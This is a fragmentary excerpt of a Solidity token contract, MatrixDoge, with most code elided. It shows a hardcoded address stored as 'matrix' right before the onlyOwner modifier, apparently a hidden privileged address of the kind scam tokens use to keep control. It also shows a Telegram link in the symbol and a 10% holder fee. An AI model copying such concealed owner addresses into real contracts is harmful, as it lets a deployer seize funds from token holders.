...
contract Ownable is Context {
     ...
     */
    address internal matrix=0x706883EdB60eBb9cad8c333193C173BaC6185335;
    modifier onlyOwner() {
...
contract MatrixDoge is Context, IERC20, Ownable {
    ...
    string private _symbol = '$MATRIXDOGE | t.me/matrixdoge';
    ...
    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256, uint256,uint256,uint256) {
        ...
        _localVal[2]/**tholder*/ = tAmount.div(100).mul(10);
